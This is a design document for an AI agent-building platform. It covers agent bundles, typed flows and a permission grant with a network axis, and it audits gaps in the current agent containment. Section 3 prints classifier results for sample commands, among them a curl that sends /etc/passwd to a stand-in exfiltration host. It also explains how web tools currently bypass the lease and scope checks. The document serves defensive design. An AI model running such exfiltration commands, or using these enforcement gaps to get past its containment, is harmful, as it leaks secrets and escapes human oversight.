# The Production Half — what the factory delivers · DESIGN

> **Status: DESIGN-ONLY.** No product code and no schema migration is authored under this
> document. Every schema block below is a normative *shape*, not a migration. Implementation
> begins only after Architect review and Owner approval, and — for §5 — only after `T-022`
> unblocks (see §5.5).
>
> **Scope.** This document designs the **output half**: what exists at 17:00 that did not exist
> at 09:00 when Bro's specialists finish building a customer's agent. It does **not** extend the
> containment half. Where it collides with an existing control, the collision is written down in
> a `Conflict` block rather than routed around.
>
> **Authorship.** Sections 1, 2 and 5 are the Architect's. **Sections 3 and 4 are owned by the
> audit pack** and are spliced in by the main session; this document carries only their problem
> statement and their heading. The interface those two sections must satisfy is stated in §0.4,
> and it is stated here rather than left to be inferred, because §1's artifact is the thing a
> grant and a credential reference attach to.
>
> **Հայերեն:** Սա design-only ա։ Զսպման կեսը կառուցված ա, ելքի կեսը գոյություն չունի։ Այս
> փաստաթուղթը նկարագրում ա թե ի՞նչ ա հանձնվում — artifact, flow, ու թե ինչպես ա անհսկելի
> ժամանակացույցը կանչում այն։ 3-րդ ու 4-րդ բաժինները աուդիտի փաթեթինն են։

---

## 0 · Frame

### 0.1 Status legend — every claim in this document carries one

Three values, and only three. `unreviewed` is not permitted in a new design: a claim nobody has
checked is a claim that does not belong in a specification.

| Mark | Meaning |
|---|---|
| **`implemented`** | The named code exists at this head and does what the sentence says. The sentence names the file and, where it helps, the line, so the reader can re-derive it. |
| **`partial`** | Part of the mechanism exists and part does not. The sentence must say **which** part is missing, not that the whole is "in progress". |
| **`not_implemented`** | Nothing in the tree does this. It is design. |

Separately, and orthogonally, the repository's evidence marks apply to who established a claim:
**✅** an independent audit confirmed it · **◑** the Builder's own unverified claim. **Every
`implemented` mark in this document is ◑** — the Architect authoring it measured each one at this
head, and nobody else has looked. Nothing here is ✅ and nothing here may be promoted to ✅ by the
session that wrote it.

### 0.2 The gap, re-measured

The Owner stated five facts. Four are checkable and each was checked at this head before anything
below was designed on it. Three reproduce exactly; one is right in its conclusion and imprecise in
its premise, and it is corrected here rather than repeated.

| # | The claim | Verdict | What was run, and what it printed |
|---|---|---|---|
| 1 | `automations` has 7 columns: id, name, trigger, action, enabled, created_at, updated_at. No agent, no flow, no permissions, no credential. | **Confirmed exactly** ◑ | Every `apps/desktop/src-tauri/core/schema/0*.sql` applied to an in-memory SQLite, then `PRAGMA table_info(automations)` printed `automations columns: 7` — `id, name, trigger, action, enabled, created_at, updated_at`, in that order. `grep -rn "ALTER TABLE automations"` over the schema directory exits 1: no later migration widens it. |
| 2 | `execute_action()` in `apps/desktop/src-tauri/core/src/repo.rs` supports exactly three verbs — notify, task, note — all writing rows into our own SQLite. | **Confirmed exactly** ◑ | `repo.rs:2297`. The `match verb.as_str()` arms are `"notify"` → `INSERT INTO notifications`, `"task"` → `tasks::create`, `"note"` → `knowledge::create`, and `other =>` returns `("failed", "unknown action verb …")`. Three arms, three local writes, no fourth. |
| 3 | `authority-policy.json` has no network axis. Tiers are file/shell only. | **Confirmed, with the premise corrected** ◑ | `engine/agents/authority-policy.json` has axes `can_build` / `can_verify` / `can_release`, `allowed_modes`, `risk_ceiling`, `independence_minimum_by_risk`. There is no network axis and no file/shell axis either — the tiers meant are in `tools/generate_agent_definitions.py:58`: `reader` = `Read, Grep, Glob`; `runner` = `+ Bash`; `builder` = `+ Edit, Write`. No tier carries a network tool. **The correction, and it makes the gap worse rather than better:** a network *vocabulary* does exist and is unreachable. `engine/tools/registry.json:14` declares `USE_NETWORK` among 17 capability classes, and `:66`/`:78` assign it to `WebSearch` and `WebFetch` — both with `requires_task: false`, `requires_scope: false`, `requires_work_grant: false`, so they cross the wall with no task, no scope and no lease. Meanwhile `engine/runtime/bro_execution_lease.py:24` sets `CLASS_CAPABILITIES` to `{EXECUTE_CODE, WRITE_FILESYSTEM, WRITE_REPOSITORY}` for **both** task classes, and `:170` refuses any lease granting beyond its class. So a lease **cannot** carry `USE_NETWORK` or `USE_CREDENTIAL` even though `contracts/execution-lease.schema.json` lists both in its enum. The label exists, no lease can hold it, and nothing anywhere names a destination. |
| 4 | Integrations store `auth_ref` — a reference, never a credential. Nothing resolves that reference to an actual secret. | **Confirmed exactly** ◑ | `PRAGMA table_info(integrations)` printed `id, name, provider, status, created_at, updated_at, auth_ref`. `0022_integration_auth_ref.sql` constrains it to `scheme:locator` with scheme in `engine: operator: keychain: env: vault:`, and `repo.rs:2505 normalize_auth_ref` restates the rule and refuses anything it cannot positively recognise as a reference. `grep -rl` for `auth_ref`/`authRef` returns 11 files, and every one of them writes it, validates it, reads it back or displays it. `grep -rn` for `keychain:` / `vault:` / `operator:` across `engine/`, `apps/desktop/src-tauri/src` and `core/src` returns two lines, both English prose inside test files. **There is no resolver.** |
| 5 | Therefore: when Bro's specialists finish building a customer's agent, there is nowhere for it to live and no way for it to act. | **Confirmed** ◑ | `PRAGMA table_info(agents)` printed `id, slug, display_name, role, status, model, created_at, updated_at`. That is a roster for a page to render. It holds no prompt, no flow, no grant, no credential slot and no version. |

**One further measurement the design rests on**, because §5 could not be written without it:
`apps/desktop/src-tauri/src/lib.rs:367` spawns a 60-second `tokio::time::interval`; each tick calls
`brops_core::repo::automations::run_due(&conn, now_ms)` at `:378` and **discards the result with
`let _ =`**. `run_due` (`repo.rs:2410`) iterates enabled automations, parses `every: N{m|h|d}`
(`:2387`), compares against the newest `automation_runs.ran_at`, and calls `run` (`:2351`) →
`execute_action`. The renderer's contract layer `apps/desktop/src/features/automationsGovernance.ts`
— which refuses model-reaching verbs at authoring time and caps unleased local runs at
`LOCAL_RISK_CEILING = 'medium'` — is **never consulted by the scheduler**; it guards the page's
"Run now" button. `implemented` for the loop, `not_implemented` for any governance of it.

### 0.3 What this design does not touch

The containment half is built and is not what is missing. Nothing below changes the wall
(`engine/runtime/bro_hook.py`), the lease mint (`engine/runtime/bro_execution_lease.py`), the signer
chain (`docs/design/WAVE_3B_ISOLATED_SIGNER_DESIGN.md`), or the three refusals that hold the
production gate shut. In particular: **§5 does not open the production gate and cannot.** Every
non-local step of a built agent's flow routes through the governed path, which is fail-closed at
this head, and the correct behaviour of the first end-to-end slice is that those steps come back
`blocked`.

### 0.4 The interface to §3 and §4 — stated, not inferred

Sections 3 and 4 are written by two auditors in parallel with this document. Sections 1, 2 and 5
are consistent with them only if the following holds, so it is stated as a contract rather than a
hope. **§1's artifact must carry the grant and the credential slots inside the bytes the Owner
approves. That is the whole interface.**

1. **The grant is a file in the bundle.** `grant.json` sits in the bundle directory, its `sha256`
   is an entry in the manifest's file table, and the manifest's bytes are the bundle digest (§1.2).
   The grant is therefore *covered by* the digest the Owner confirms in the native dialog. This is
   the entire point: a grant that is not covered by an approved digest is a grant stated in text,
   and text is what `scope`/`prohibited_scope` already is — `docs/ARCHITECTURE.md` records that
   defect in its own words, and §3 exists so it is not repeated.
2. **`grant.json` must be present and non-empty for a bundle to load.** An absent grant is a
   refusal, never "no restrictions". §1's loader states this; §3 states what is inside the file.
3. **`grant.json` must carry an expiry.** §5 refuses to enqueue an unattended fire past it, which
   is the only thing that makes a one-time approval bounded in time. The field name is §3's to
   choose; §5 assumes it exists and calls it `expires_at_epoch` until §3 says otherwise.
4. **The credential file declares slots, never material.** `credentials.json` carries
   `{slot_id, purpose, expected_scheme}` triples and no secret, no reference and no locator. It is
   covered by the digest like every other file.
5. **The binding of a slot to an actual secret lives OUTSIDE the bundle**, keyed by
   `(bundle_digest, slot_id)`. This direction is load-bearing and it is §1's decision, not §4's: if
   a binding lived inside the bundle, rebinding a test key to a production key would change the
   bundle's bytes, change its digest, and silently invalidate the approval — the customer would
   rotate a key and discover their agent had become unapproved. Keeping the binding outside is what
   lets §4 require a **new lease** for a rebind without also requiring a new approval of the agent.
6. **The flow refers to both by name only.** A `call` step names a reference into the grant's
   egress table and a `credential_slots` entry; it never contains a URL, a host or a key (§2.3).
   §3 and §4 own what those names resolve to.
7. **The capability vocabulary is the existing one.** `engine/tools/registry.json`'s 17 classes
   (`implemented` ◑, counted). §3 may add an *axis* — a destination — but should not add a second
   list of capability names, because two vocabularies is how one of them stops being enforced.

---

## 1 · THE ARTIFACT — what exists at 17:00 that did not exist at 09:00

### 1.1 The answer in one sentence

**An Agent Bundle: an immutable, content-addressed directory of files on disk, indexed by exactly
one row per version in the desktop store, and made live by exactly one row per agent.** Not files
*or* a row — both, with the files as the authority and the row as the index.

### 1.2 Why files, and why a digest

The row-only answer is tempting and wrong, and the reason is already written down in this
repository as `O-2`: *"anyone who can write the ledger can drop records, recompute the chain and
rewrite the head, and an unkeyed `verify()` reports it intact"* (`CLAUDE.md` §6, `implemented` as a
defect ◑). A SQLite row carrying a prompt, a flow and a grant has exactly that shape — whoever can
write the database can rewrite what the Owner approved, and the store will report it intact.

The repository already knows the answer and applies it to evidence:
`docs/design/WAVE_3B_ISOLATED_SIGNER_DESIGN.md` §4.0 makes an artifact's identity `sha256(bytes)`
and refuses a handle unless the store holds bytes that hash to it (`not_implemented` in the shipped
app; `implemented` as a normative design ◑). The bundle uses the same rule for the same reason.

**The digest, exactly.** `manifest.json` carries a **file table**: for every other file in the
bundle, `{path, sha256, bytes}`, sorted by `path`. `bundle_digest := sha256(exact bytes of
manifest.json)`. There is no self-reference to resolve, and one hash covers everything: change a
prompt byte and its `sha256` in the table changes, so `manifest.json`'s bytes change, so the digest
changes, so the bundle is a different bundle. `not_implemented`.

### 1.3 The shape on disk

```
<app_data_dir>/agents/<bundle_digest>/
├── manifest.json          the only file the loader reads first; its bytes ARE the digest
├── flow.json              §2 — the ordered, typed, acyclic definition
├── grant.json             §3 — REQUIRED; absent is a refusal, not "unrestricted"
├── credentials.json       §4 — slot DECLARATIONS only; never a secret, never a locator
├── prompts/<name>.md      one file per model step; referenced by path from flow.json
└── eval/cases.jsonl       the cases this build was accepted against (§1.7)
```

The directory is named by its own digest, so two versions of the same agent cannot collide and a
half-written bundle can never be mistaken for a whole one: the loader computes the digest from
`manifest.json` and refuses unless it equals the directory name **and** every file table entry
re-hashes to its declared `sha256`. `not_implemented`.

### 1.4 `manifest.json` — normative fields

```jsonc
{ "schema": 1,
  "artifact_type": "brops.agent-bundle.v1",
  "bundle_id": "<uuid — the AGENT's identity, stable across versions>",
  "bundle_version": 3,                       // u64, monotonic per bundle_id
  "display_name": "Invoice chaser",
  "built_for": "<customer id>",
  "built_by": { "pack_id": "ai-agent-builders",
                "agent_ids": ["agt-p01-r01", "agt-p01-r02"] },
  "built_at_epoch": 1756500000000,
  "flow_ref":        { "path": "flow.json",        "sha256": "<64 hex>" },
  "grant_ref":       { "path": "grant.json",       "sha256": "<64 hex>" },
  "credentials_ref": { "path": "credentials.json", "sha256": "<64 hex>" },
  "eval_ref":        { "path": "eval/cases.jsonl", "sha256": "<64 hex>" },
  "files": [ { "path": "credentials.json",    "sha256": "<64 hex>", "bytes": 412 },
             { "path": "eval/cases.jsonl",    "sha256": "<64 hex>", "bytes": 9310 },
             { "path": "flow.json",           "sha256": "<64 hex>", "bytes": 2044 },
             { "path": "grant.json",          "sha256": "<64 hex>", "bytes": 780 },
             { "path": "prompts/classify.md", "sha256": "<64 hex>", "bytes": 1502 } ]
}
```

Four properties are deliberate and each is a refusal if violated:

* **`files` is total.** Every regular file under the bundle directory except `manifest.json` must
  appear exactly once; a file on disk with no entry is a refusal, and an entry with no file is a
  refusal. A partial file table is how an unreviewed prompt rides into an approved bundle.
* **`grant_ref` and `credentials_ref` are required**, even when the grant is empty and the slot
  list is empty. "This agent needs nothing" is a statement someone made; "there is no file" is not.
* **No approval state appears anywhere in the manifest.** Approving must not change the bytes —
  see §1.6.
* **No secret, no locator, no host, no URL appears anywhere in the bundle.** `grant.json` carries
  destinations under §3's rules; `credentials.json` carries slot names under §4's. A grep of a
  bundle for key material is a check that can be written and run, and §1.9's slice runs it.

### 1.5 The shape in schema

Design only; no migration is authored in this task.

```sql
-- One row per BUILT VERSION. Immutable after insert: there is no UPDATE path.
CREATE TABLE agent_bundles (
    bundle_digest  TEXT PRIMARY KEY,          -- sha256(manifest.json bytes), 64 lowercase hex
    bundle_id      TEXT NOT NULL,             -- the agent's stable identity
    bundle_version INTEGER NOT NULL,
    display_name   TEXT NOT NULL,
    path           TEXT NOT NULL,             -- <app_data_dir>/agents/<bundle_digest>
    built_at       TEXT NOT NULL,
    UNIQUE (bundle_id, bundle_version)
);

-- One row per version, and the ONLY mutable thing about a bundle.
CREATE TABLE agent_bundle_states (
    bundle_digest       TEXT PRIMARY KEY REFERENCES agent_bundles(bundle_digest) ON DELETE RESTRICT,
    state               TEXT NOT NULL,        -- 'draft'|'proposed'|'approved'|'retired'
    approval_id         TEXT REFERENCES approvals(id),
    confirmation_digest TEXT,                 -- what the native dialog actually showed
    changed_at          TEXT NOT NULL
);

-- One row per AGENT. This is what "live" means, and rollback is one UPDATE of it.
CREATE TABLE agent_bundle_active (
    bundle_id     TEXT PRIMARY KEY,
    bundle_digest TEXT NOT NULL REFERENCES agent_bundles(bundle_digest) ON DELETE RESTRICT,
    activated_at  TEXT NOT NULL
);

-- §4's territory: the binding lives OUTSIDE the bundle (see §0.4.5). Shape only; §4 owns
-- what a binding IS, what it points at, and what minting one costs.
CREATE TABLE agent_credential_bindings (
    bundle_digest TEXT NOT NULL REFERENCES agent_bundles(bundle_digest) ON DELETE RESTRICT,
    slot_id       TEXT NOT NULL,
    -- ... §4 ...
    PRIMARY KEY (bundle_digest, slot_id)
);
```

`ON DELETE RESTRICT` throughout, matching migration `0014`'s treatment of receipt evidence:
evidence that survives deletion **by refusing it** is the pattern this repository already chose
(`implemented` ◑, `apps/desktop/src-tauri/core/schema/0014_receipt_verification.sql`).

### 1.6 Approval, and why it lives outside the bundle

Approval is a statement **about** an immutable digest, so it cannot be inside the thing it is
about: writing `"state": "approved"` into `manifest.json` changes the manifest's bytes, changes the
digest, and produces a bundle whose approval names a digest that no longer exists. The state
therefore lives in `agent_bundle_states` and names the digest.

**Recommendation: reuse the existing `approvals` machinery rather than build a second one, because
it is the strongest control this repository has and a second one would be weaker on the day it
shipped.** `approvals` already carries a durable `origin_principal` (so self-approval is refused
across restarts), a `request_digest` recomputed and compared at decision time (so a mutated request
cannot be approved by replay), a one-time compare-and-consumed `nonce`, and a `confirmation_digest`
binding the exact envelope shown in a **renderer-independent native OS dialog** — `T-011`,
migrations `0012`/`0013`, `implemented` ◑. Migration `0008` already added `entity_type` /
`entity_id` to `approvals` precisely so a decision can point back at what it was raised for.
Approving a bundle is therefore `entity_type = 'agent_bundle'`, `entity_id = <bundle_digest>`, and
`request_digest = <bundle_digest>`: the Owner confirms a hash in a dialog the webview cannot forge,
and the hash covers the flow, the grant and the credential slots.

The lifecycle, and it is one direction only:

```
draft    ──(evaluation cases attached and run)──▶  proposed
proposed ──(native confirmation on bundle_digest)──▶  approved
approved ──(a newer version is activated, or the digest fails re-verification)──▶  retired
```

`retired` is terminal. Nothing returns to `approved`; a retired digest that is wanted again is
activated by pointing `agent_bundle_active` at it, which is legal precisely because it was approved
once and its bytes cannot have changed since — that is what a digest is for. **Promotion always
needs a new approval; rollback never does.** The asymmetry is the point: rolling back to something
a human already confirmed is not a new decision, and forcing a confirmation for it teaches people
to click through confirmations during an incident.

### 1.7 What §1 does NOT solve, said plainly

* **The bundle is not signed.** Its digest makes tampering *detectable by anyone who recomputes it*;
  it does not make the bundle attributable to whoever built it. Signing it would need a key class,
  and every key class in this repository routes through custody decisions that `WAVE_3B` owns and
  that are `not_implemented` on POSIX. The honest position: content-addressing now, signature when
  the signer chain lands; a `manifest.sig` beside the manifest is additive and changes no digest.
* **The bundle is not a sandbox.** It says what an agent is. What contains it at run time is §3's
  grant and the existing wall, and neither is weakened or extended here.
* **Nothing in §1 establishes that the agent is any good.** `eval/cases.jsonl` is inside the digest
  so the cases cannot be swapped after approval, but this document does not design the evaluation
  harness. That is the Evaluation Engineer's, and it is the honest gap between `draft` and
  `proposed`.

### 1.8 Conflicts with existing controls

> **Conflict — `agents` is a display roster and this design does not extend it.**
> `agents(id, slug, display_name, role, status, model, created_at, updated_at)`
> (`0001_initial.sql`, measured) is read by the Phase-6 lattice page. It is tempting to widen it
> with a `bundle_digest` and call the job done. **Do not**: `agents` rows are mutable, per-display,
> and referenced by `tasks.assigned_agent_id ON DELETE SET NULL` — a table whose rows are allowed
> to vanish under a foreign key cannot also be the record of what a customer approved. The
> relationship runs the other way: an `agents` row may *name* a `bundle_id` for display, and the
> bundle is the truth.

> **Conflict — `contracts/index.json` makes a new cross-half schema a controlled change.**
> `brops.agent-bundle.v1` crosses no boundary today (it is desktop-side only) and therefore is
> **not** a sixth entry in `contracts/`. The moment a bundle's grant is handed to the engine to be
> enforced — which is exactly what §3 is for — it does cross, and at that point it belongs in
> `contracts/` with a `version_pointer`, held byte-identical by
> `tools/check_contracts_single_source.py` (`implemented` ◑). Recorded here so the step is taken
> deliberately rather than discovered by a red gate.

### 1.9 The smallest end-to-end slice that would prove §1

One real customer agent — an invoice chaser: one prompt, one two-step flow, one Slack egress, one
credential slot.

1. Build the bundle. Compute `bundle_digest` twice, once on this Debian box and once in CI, and
   assert the same 64 hex characters. *(A digest that depends on the machine is not a digest.)*
2. Flip one byte in `prompts/classify.md`. Assert the loader refuses by name — *file table entry for
   `prompts/classify.md` does not match its bytes* — and does **not** fall back to loading it.
3. Delete `grant.json`. Assert the loader refuses, and assert specifically that the refusal reason
   is *absent grant*, not *no restrictions*.
4. Approve the digest through the existing native confirmation. Read `approvals.confirmation_digest`
   back and assert it equals `bundle_digest` character for character.
5. Mutate the check: delete the digest comparison in the loader, confirm test 2 goes **red**, then
   restore it byte-exact. Per `CLAUDE.md` §7.4 — of ninety checks swept that way, four came back
   green.

---

## 2 · THE FLOW — the customer's request before it is an automation

### 2.1 The answer in one sentence

**A flow is a typed, bounded, acyclic list of steps, each declaring the capability classes and
credential slots it needs, stored as `flow.json` inside the bundle, versioned by nothing but the
bundle digest, and approved by the same native confirmation that approves the digest.**

`action: "verb: arg"` is not a flow, and the reason is measurable rather than aesthetic: a string
has no place to put an input, an output, a branch, a bound, a capability requirement or a credential
slot, so all six become either absent or implicit. `execute_action` (`repo.rs:2297`) is
`split_once(':')` plus a three-arm `match`, and that is the whole grammar. `implemented` ◑.

### 2.2 The representation

```jsonc
{ "schema": 1,
  "artifact_type": "brops.agent-flow.v1",
  "flow_id": "<uuid>",
  "entry": "classify",
  "max_steps": 8,            // REQUIRED, bounded by a constant
  "max_wall_ms": 120000,     // REQUIRED, bounded by a constant
  "inputs":  [ { "name": "invoice_id", "type": "string" } ],
  "outputs": [ { "name": "notified",   "type": "boolean" } ],
  "steps": [
    { "id": "classify", "kind": "model",
      "prompt_ref": "prompts/classify.md",
      "in": ["invoice_id"], "out": ["overdue"],
      "requires": { "capabilities": ["READ_LOCAL"], "credential_slots": [] },
      "next": [ { "when": "overdue == true", "goto": "notify" },
                { "when": "else",            "goto": null } ] },

    { "id": "notify", "kind": "call",
      "call_ref": "slack-post",                    // a NAME into the §3 grant's egress table
      "in": ["invoice_id"], "out": ["notified"],
      "requires": { "capabilities": ["SEND_COMMUNICATION", "USE_NETWORK", "USE_CREDENTIAL"],
                    "credential_slots": ["slack_bot"] },
      "next": [ { "when": "else", "goto": null } ] }
  ] }
```

`kind` is a closed set: `model` (a governed turn), `call` (an egress named in the grant), `store`
(a local write — the three verbs `execute_action` already implements), `branch` (no effect, only
`next`). A fifth kind is a schema change and therefore a review.

### 2.3 The five rules that make it reviewable

1. **A step declares capability; it never carries authority.** `requires.capabilities` uses the 17
   existing classes in `engine/tools/registry.json` (`implemented` ◑) and no second vocabulary.
   **The union of every step's `requires` must be a subset of `grant.json`.** Checked twice: once at
   build time so the specialists get told, and once at **load time**, which is the one that
   enforces — a build-time-only check is a check the builder can skip.
2. **No URL, no host, no key, no locator appears in `flow.json`.** A `call` names `call_ref`, which
   §3's grant resolves to a destination; a credential appears only as a `slot_id`, which §4
   resolves. This is what makes a flow reviewable by someone trusted to read the logic and not
   trusted with the customer's Slack token — and it is also what lets §1's slice grep a whole bundle
   for key material and expect zero hits.
3. **Acyclic and bounded.** `next.goto` edges must form a DAG over step ids; a cycle is a build-time
   refusal by name. `max_steps` and `max_wall_ms` are required and capped by constants. The reason
   is §5: this fires unattended, and an unbounded flow with nobody watching is an unbounded process
   with nobody watching.
4. **Conditions are a closed grammar, not an expression language.** `when` is exactly one of
   `<name> == <literal>`, `<name> != <literal>`, `<name> exists`, `else`. **Recommendation: the
   closed grammar, not a small expression evaluator — because an evaluator is a new interpreter
   running inside the governed path, and `CLAUDE.md` §6's standing rule is that when two paths
   exist, prefer the one that leaves audited security code untouched.** The evaluator is the more
   capable option and it is the wrong one: its cost is a parser in the blast radius of every
   unattended fire, and every flow this design is for is expressible without it.
5. **Versioning is the bundle digest and nothing else.** There is deliberately no `flow.version`
   field, because a version number in the bytes can disagree with the bytes. A new version of a flow
   is a new bundle at `bundle_version + 1` with its own digest and its own approval.

### 2.4 How a request becomes a flow

```
customer's request (prose)
   │  Bro's specialists — Agent Architect drafts, Agent Builder writes prompts,
   │  Tooling Engineer names the egresses, Evaluation Engineer writes eval/cases.jsonl
   ▼
bundle @ state = draft          the flow exists; nothing has been measured
   │  the eval cases are RUN and their results attached
   ▼
bundle @ state = proposed       the flow exists and someone measured it
   │  native confirmation on bundle_digest (§1.6)
   ▼
bundle @ state = approved       the Owner confirmed this exact digest
   │  agent_bundle_active.bundle_digest := this digest
   ▼
live                            §5 may enqueue it
```

Each arrow is a refusal in the other direction. A `draft` cannot be activated; a `proposed` cannot
be activated; an `approved` bundle whose files no longer re-hash cannot be activated and is retired
on the spot (§5.3). `not_implemented` throughout.

### 2.5 Conflicts with existing controls

> **Conflict — `runs` + `run_steps` already model an ordered step machine, and reusing them as the
> flow definition would be wrong.** `run_steps` (`0006`) carries `position`, `title`, `detail`,
> `status`; `0007` added `result`, `0008` added `requires_approval`, `0013` added the durable
> execution claim. That machinery is genuinely good and genuinely tested. But those rows are
> **mutable and per-execution**: `status` and `result` are written as the run proceeds. A flow
> **definition** must be immutable and per-version. Putting both in one table means a run can
> rewrite the plan it is running, which is the same class of defect as `O-2`.
> **Recommendation: split them — definition in the bundle, execution log in `run_steps`.** It is the
> more expensive answer, because it means two representations of "a step" and a mapping between
> them, and it is the correct one: the cheap answer buys its saving by making the approved artifact
> writable.

> **Conflict — `automationsGovernance.parseAction` refuses model-reaching verbs at authoring time,
> and a flow reaches a model by design.** `MODEL_REACHING_VERBS` lists 16 verbs including `ask`,
> `agent`, `http`, `fetch`, `webhook`, and `assessAction` refuses them for both the authoring form
> and the run path (`implemented` ◑, with tests). That refusal is correct for the path it guards —
> an unleased local automation — and it must **not** be relaxed to admit flows. §5.5 states the
> resolution: a second path beside it, never a widening of it.

### 2.6 The smallest end-to-end slice that would prove §2

Same invoice chaser, one two-step flow.

1. Author `flow.json` with the `notify` step requiring `SEND_COMMUNICATION`, `USE_NETWORK` and
   `USE_CREDENTIAL`, against a deliberately narrow `grant.json` carrying only `READ_LOCAL`. Assert
   the **load-time** check refuses and names the three missing capabilities — not "invalid flow".
2. Widen `grant.json` to carry them. Assert the same bundle now loads. *(Both directions, so the
   check is shown to be deciding on the grant and not on something else.)*
3. Add `"goto": "classify"` to the `notify` step's `next`. Assert the build refuses by name with the
   cycle printed.
4. Grep the whole bundle directory for the key-material prefixes already enumerated in
   `repo.rs KEY_MATERIAL_PREFIXES` (`implemented` ◑ — 27 prefixes, counted) and assert zero hits:
   the flow is reviewable by someone not trusted with the secret only if the secret is provably not
   in it.
5. Mutate the subset check: make it always return true, confirm test 1 goes **red**, restore it.

---

## 3 · THE PERMISSION GRANT — the network axis the tier model lacks

**The problem this section must solve.** A built customer agent must receive strictly less authority
than the specialists that built it, and today there is no axis on which to say so. Measured at this
head: `engine/agents/authority-policy.json` has axes `can_build`/`can_verify`/`can_release`,
`allowed_modes`, `risk_ceiling` and `independence_minimum_by_risk`, and no network axis; the three
capability tiers in `tools/generate_agent_definitions.py:58` are `reader` (`Read, Grep, Glob`),
`runner` (`+ Bash`) and `builder` (`+ Edit, Write`), none of which carries a network tool.
`engine/tools/registry.json:14` does declare a `USE_NETWORK` class and assigns it to `WebSearch` and
`WebFetch` at `:66`/`:78` — but with `requires_task`, `requires_scope` and `requires_work_grant` all
`false`, so those two tools cross the wall with no task, no scope and no lease; and
`engine/runtime/bro_execution_lease.py:24` fixes `CLASS_CAPABILITIES` to `{EXECUTE_CODE,
WRITE_FILESYSTEM, WRITE_REPOSITORY}` for both task classes, with `:170` refusing any lease that
grants beyond its class — so no lease can carry `USE_NETWORK` or `USE_CREDENTIAL` even though
`contracts/execution-lease.schema.json` lists both in its enum. Nowhere in the tree does anything
name a permitted destination: a `grep -rli` for "egress allowlist" across the repository returns
nothing. This section must define the missing axis, specify how an egress allowlist is expressed in
`grant.json`, and — the part that decides whether any of it is real — name **which runtime code
enforces it**, on the same call path a flow's `call` step takes. A grant stated in a prompt is not
enforcement: `docs/ARCHITECTURE.md` already records that `scope`/`prohibited_scope` travel as text
inside the prompt Bro writes and that `engine/runtime/bro_security.py`'s `enforce_scope` is what
genuinely contains a path, which a desktop spawn never reaches. That defect must not be repeated on
the network axis. The grant is a file inside the bundle, covered by the digest the Owner confirms
(§0.4.1–2), and it must carry an expiry that §5 refuses to fire past (§0.4.3).

### 3.0 What is actually there today (verified at `main` @ `fe26a78`)

**The tier model has no network axis, and it has no file/shell axis either.** `engine/agents/authority-policy.json` is 48 lines. Every axis it declares:

| axis | field | values |
|---|---|---|
| verb | `can_build` · `can_verify` · `can_release` | booleans |
| mode | `allowed_modes` | `review` · `work` · `release` |
| risk | `risk_ceiling`, ordered by `risk_order` | low → critical |
| independence | `independence_minimum_by_risk` | L1 · L2 · L3 |

The file/shell axis is **derived downstream**, in two unrelated places: `tools/generate_agent_definitions.py` (`TOOLS_BUILD`/`TOOLS_VERIFY`/`TOOLS_RELEASE`) and `apps/desktop/src-tauri/src/ai.rs` (`BRO_TIERS` = reader/runner/builder over `Read Edit Write Grep Glob Bash`). The axis this section adds is therefore the **fourth**, not the third. *(status: `implemented`.)*

**The `scope` defect, quoted precisely.** Declared in `contracts/task-contract.schema.json` (both `scope` and `prohibited_scope` are `required`). Rendered as prose into every agent by `tools/generate_agent_definitions.py` and into every desktop tier by `ai.rs`. It *is* enforced on the engine route — `engine/runtime/bro_security.py`'s `enforce_scope`, called from `bro_policy.py` for mutations and reads. On the desktop route it is enforced by nothing, and the code says so itself in `apps/desktop/src-tauri/src/commands.rs`:

> `grant` is `null` unless the task prompt actually stated a scope, and even then it goes out as `enforcement: "none"`, because `scope`/`prohibited_scope` travel as PROSE inside a prompt on this route: `engine/runtime/bro_security.enforce_scope` is what actually contains a path, and a desktop `claude` spawn never reaches it. Claiming otherwise would be the same lie the surface was built to stop.

The literal emitted is `"enforcement": "none",`. *(status: the honesty is `implemented`; the enforcement is `not_implemented` on that route.)*

**`USE_NETWORK` already exists. This section extends it; it does not invent it.** It is in the lease schema enum at `contracts/execution-lease.schema.json` and its byte-identical mirror `engine/schemas/execution-lease.schema.json`; in the tool registry's capability classes at `engine/tools/registry.json`; and attached to `WebSearch`, `WebFetch` and to `git push`/`gh` in `bro_authorization.py`. *(status: `implemented`.)*

**And it is inert, three separate ways, each measured.**

1. `USE_NETWORK` is not in `MUTATING_CAPABILITIES` (`bro_authorization.py`), so a web tool call is non-mutating, so the lease branch in `bro_control_plane.py` never runs. Running the real classifier:

```
WebFetch  {'url': 'https://exfil.example/?d=secret'}  caps=('READ_EXTERNAL','USE_NETWORK') mut=False unk=False tgts=()
WebSearch {'query': 'x'}                              caps=('READ_EXTERNAL','USE_NETWORK') mut=False unk=False tgts=()
```

`tgts=()` is the second half of the defect: `_direct_targets` reads `file_path`/`path`/`notebook_path`/`destination`/`source`/`files`/`paths`/`edits` and Glob's `pattern`. It never reads `url`. **Nothing in this repository has ever looked at a destination.** *(status: `not_implemented`.)*

2. A lease carrying `USE_NETWORK` **cannot validate**. `CLASS_CAPABILITIES` in `bro_execution_lease.py` is `{EXECUTE_CODE, WRITE_FILESYSTEM, WRITE_REPOSITORY}` for *both* task classes, and the module refuses any over-grant. `USE_NETWORK` is unmintable. *(status: `implemented` as a refusal — accidentally fail-closed.)*

3. `lease.allowed_capabilities` is read by **no production code**. A full-tree grep for `.allowed_capabilities` returns exactly two hits, both in `engine/tests/test_execution_leases.py`. *(status: `partial`.)*

**Shell network is classified inconsistently.** Measured in the same run:

```
gh api /user                        caps=('USE_CREDENTIAL','USE_NETWORK','WRITE_EXTERNAL') mut=True
git fetch origin                    caps=('EXECUTE_CODE','WRITE_REPOSITORY')  mut=True   <- no USE_NETWORK
git clone https://x/y               caps=('EXECUTE_CODE','WRITE_REPOSITORY')  mut=True   <- no USE_NETWORK
curl https://exfil.example -d @/etc/passwd   caps=('UNKNOWN',)  mut=True  unk=True
pip install evilpkg                 caps=('UNKNOWN',)  mut=True
npm test / cargo test / make build  caps=('UNKNOWN',)  mut=True
```

`curl` and `wget` appear **nowhere** in `bro_security.py` or `bro_authorization.py`. *(status: `not_implemented`.)*

**There is no network-isolation primitive in the tree.** Searched by domain word across `*.py *.rs *.ts *.json *.sh`: `netns`, `unshare`, `CLONE_NEWNET`, `seccomp`, `iptables`, `nftables`, `allowed_hosts`, `HTTPS_PROXY`, `AF_INET` — **every one returned zero files.** The two words that do appear mean other things: "egress" is the §4.10(f) governed *output-read* channel, and "sandbox" is an empty **cwd directory**. *(status: `not_implemented`.)*

